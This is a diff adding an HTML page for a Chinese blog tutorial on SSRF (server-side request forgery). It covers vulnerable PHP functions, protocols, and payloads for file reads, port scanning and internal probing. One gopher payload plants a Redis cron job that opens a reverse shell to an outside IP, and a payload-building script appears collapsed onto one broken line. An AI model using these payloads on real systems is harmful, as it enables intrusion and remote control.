@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-hacker.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-hacker.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-hacker.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言SSRF与CSRF有一些相似之处，也有很大区别。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF服务端请求伪造">
+<meta property="og:url" content="http://example.com/2022/12/09/SSRF/index.html">
+<meta property="og:site_name" content="Scammer">
+<meta property="og:description" content="前言SSRF与CSRF有一些相似之处，也有很大区别。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/simg/ssrf_1.png">
+<meta property="og:image" content="http://example.com/simg/ssrf_2.png">
+<meta property="og:image" content="http://example.com/simg/ssrf_3.png">
+<meta property="og:image" content="http://example.com/simg/ssrf_4.png">
+<meta property="og:image" content="http://example.com/simg/ssrf_5.png">
+<meta property="article:published_time" content="2022-12-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-09T16:58:11.839Z">
+<meta property="article:author" content="Bron">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/simg/ssrf_1.png">
+
+<link rel="canonical" href="http://example.com/2022/12/09/SSRF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <title>SSRF服务端请求伪造 | Scammer</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Scammer" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#000000;--blockquote-color:#bbb;--link-color:#000000;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#ccc;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#161616;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#8a2be2;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Scammer</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">26</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">23</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">78</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/09/SSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Elaina.png">
+      <meta itemprop="name" content="Bron">
+      <meta itemprop="description" content="原谅我这一生不羁放纵爱自由">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Scammer">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSRF服务端请求伪造
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-09 00:00:00" itemprop="dateCreated datePublished" datetime="2022-12-09T00:00:00+08:00">2022-12-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-10 00:58:11" itemprop="dateModified" datetime="2022-12-10T00:58:11+08:00">2022-12-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SSRF/" itemprop="url" rel="index"><span itemprop="name">SSRF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSRF与CSRF有一些相似之处，也有很大区别。</p>
+<span id="more"></span>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。<br><img src="/simg/ssrf_1.png" alt=" "><br><img src="/simg/ssrf_2.png" alt=" "></p>
+<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。<br>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
+<h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>了解了漏洞的原理后，我们知道所有能发起请求的地方都可能会存在SSRF漏洞，我们可以根据“漏洞代码”中的常见方法对项目进行自查。以下列举一些最容易出现本漏洞的场景：</p>
+<ol>
+<li>能填写链接的地方</li>
+</ol>
+<ul>
+<li>业务场景</li>
+<li>从URL上传图片</li>
+<li>订阅RSS</li>
+<li>爬虫</li>
+<li>预览</li>
+<li>离线下载</li>
+</ul>
+<ol start="2">
+<li>数据库内置功能</li>
+</ol>
+<ul>
+<li>Oracle</li>
+<li>MongoDB</li>
+<li>MSSQL</li>
+<li>Postgres</li>
+<li>CouchDB</li>
+</ul>
+<ol start="3">
+<li>邮箱服务器收取其他邮箱邮件</li>
+</ol>
+<ul>
+<li>POP3&#x2F;IMAP&#x2F;SMTP</li>
+</ul>
+<ol start="4">
+<li>文件处理、编码处理、属性处理</li>
+</ol>
+<ul>
+<li>FFmpeg</li>
+<li>ImageMagick</li>
+<li>Docx</li>
+<li>PDF</li>
+<li>XML</li>
+</ul>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。<br>主要分为两个方向，SSRF 利用相关的危险函数；SSRF 可利用的协议操作。</p>
+<ul>
+<li>访问正常文件<br>访问正常文件，例如 提交参数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure></li>
+<li>端口扫描<br>当访问未开放端口，脚本会显示空白或报错。例如 提交参数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+当访问开放端口时，脚本会显示banner信息：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1:3306</span><br></pre></td></tr></table></figure></li>
+<li>读取系统本地文件<br>利用file协议可以任意读取系统本地文件，提交参数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file://c:windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure></li>
+<li>内网web应用指纹识别<br>识别内网应用使用的框架，平台，模块以及cms可以为后续的渗透测试提供很多帮助。大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。根据这些信息就可以针对性的搜索漏洞进行攻击。<br>比如可以通过访问下列文件来判断phpMyAdmin是否安装以及详细版本：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://localhost/phpmyadmin/README</span><br></pre></td></tr></table></figure></li>
+<li>攻击内网应用<br>内网的安全通常都很薄弱，溢出、弱口令等一般都是存在的。通过ssrf攻击，可以实现对内网的访问，从而可以攻击内网应用或本地机器，获得shell，这里的应用包括服务、web应用等。<br>仅仅通过get方法可以攻击的web应用有很多，比如struts2命令执行等。<br>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class="line">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line"></span><br><span class="line">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>file_get_contents这一函数是把传入的参数(变量)写入字符串，当把 传参是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上述测试代码中，file_get_contents()函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似于ssrf.php?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd的payload即可读取服务器本地的任意文件。<br><img src="/simg/ssrf_3.png" alt=" "><br>readfile()函数与file_get_contents()函数相似。</p>
+<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h2><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code><br>hostname: 如果安装了 OpenSSL，那么可以在主机名地址前面添加 ssl:&#x2F;&#x2F; 或者是 tls:&#x2F;&#x2F;，从而可以使用基于 TCP&#x2F;IP 协议的 SSL 或者 TLS 的客户端连接到远程主机。<br>port: 端口号。可以省略该参数或传 -1，则表示传输器不使用端口，例如 unix:&#x2F;&#x2F;。<br>errno: 如果errno的返回值为0，而且这个函数的返回值为FALSE，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误。<br>errstr: 错误信息将以字符串的信息返回。<br>timeout: 设置连接的时限，单位为秒。fsockopen()的连接时限（timeout）的参数仅仅在套接字连接的时候生效。</p>
+<p>用于打开一个网络连接或一个unix套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其它文件类函数调用（如：fgets(),fgetss(),fwrite(),fclose()还有feof()）。如果调用失败，将会返回false。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br/&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">	<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：</code><br><img src="/simg/ssrf_4.png" alt=" "></p>
+<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h2><p>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。<br>curl_exec — 执行 cURL 会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl_exec(resource $ch): mixed</span><br></pre></td></tr></table></figure>
+<p>执行给定的 cURL 会话。<br>这个函数应该在初始化一个 cURL 会话并且全部的选项都被设置后被调用。<br>成功时返回 true， 或者在失败时返回 false。 然而，如果 设置了 CURLOPT_RETURNTRANSFER 选项，函数执行成功时会返回执行的结果，失败时返回 false 。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();  <span class="comment">// 创建新的cURL资源</span></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_URL, <span class="variable">$link</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_OPTRETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);  <span class="comment">// 抓取URL并把它传给浏览器</span></span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);  <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line">	<span class="comment">// file_put_content($filename, $result);</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$result</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：</code><br><img src="/simg/ssrf_5.png" alt=" "></p>
+<h1 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h1><p>SSRF漏洞的利用所涉及的协议有：</p>
+<ul>
+<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
+<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
+<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
+<li>http&#x2F;s协议：探测内网主机存活</li>
+</ul>
+<h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h2><p>payload的利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/password # file:// 之后可以接任意文件</span><br></pre></td></tr></table></figure>
+<p>这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?url=file:///etc/password</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>探测一下内网活着的主机（但是很多不会开Http协议，没多大用）<br>抓一下包，在Burp里面探测一下就行</p>
+<h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://ip/info 可获取本地redis服务配置信息</span><br></pre></td></tr></table></figure>
+<p>如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server</p>
+<h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；<br>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。<br>gopher协议在各个编程语言中的限制：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php  	--write-curlwrappers且php版本至少为5.3</span><br><span class="line">—wite-curlwrappers选项含义：运用curl工具打开url流</span><br><span class="line">curl使用curl —version查看版本以及支持的协议</span><br><span class="line">Java	小于JDK1.7</span><br><span class="line">Curl 	低版本不支持</span><br><span class="line">Perl 	支持</span><br><span class="line">ASP.NET 小于版本3</span><br></pre></td></tr></table></figure>
+<p>Curl的所需参数是一个URL，即URLEncode后的链接（重点）</p>
+<ul>
+<li>格式：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line">gopher的默认端口是70</span><br><span class="line">如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码（详细注意事项见下）</span><br></pre></td></tr></table></figure>
+gopher发送get请求</li>
+<li>问号（?）需要转码为URL编码，也就是%3f</li>
+<li>回车换行要变为%0d%0a，但如果直接用工具转，可能只会有%0a</li>
+<li>在HTTP包的最后要加上%0d%0a，代表消息结束（具体可研究HTTP包结束）<br>可直接转换的脚本：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import reimport urllib.parsedata=\    &#x27;&#x27;&#x27;GET /try.php?a=Wan&amp;b=Zifeng HTTP/1.1Host: 192.168.0.130:8201Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&#x27;&#x27;&#x27;data=urllib.parse.quote(data)strinfo=re.compile(&#x27;%0A&#x27;,re.I)new=strinfo.sub(&#x27;%0D%0A&#x27;,data)new=&#x27;gopher://192.168.0.130:8201/_&#x27;+new+&#x27;%0D%0A&#x27;new=urllib.parse.quote(new)with open(&#x27;Result.txt&#x27;,&#x27;w&#x27;) as f:    f.write(new)with open(&#x27;Result.txt&#x27;,&#x27;r&#x27;) as f:    for line in f.readlines():        print(line.strip())</span><br></pre></td></tr></table></figure>
